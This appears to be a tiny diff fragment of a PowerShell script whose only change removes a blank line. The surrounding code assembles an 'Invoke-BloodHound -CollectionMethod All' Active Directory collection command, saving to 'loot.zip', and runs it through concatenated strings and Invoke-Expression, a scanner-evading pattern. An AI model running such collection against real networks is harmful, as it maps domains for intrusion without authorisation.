@@ -5,7 +5,6 @@ $mid = @'
 Invoke-BloodHound -CollectionMethod All -ZipFileName loot.zip"
 '@
 $post = ')'
-
 $joined = $pre + $mid + $post
 $sb = Invoke-Expression $joined
 & $sb
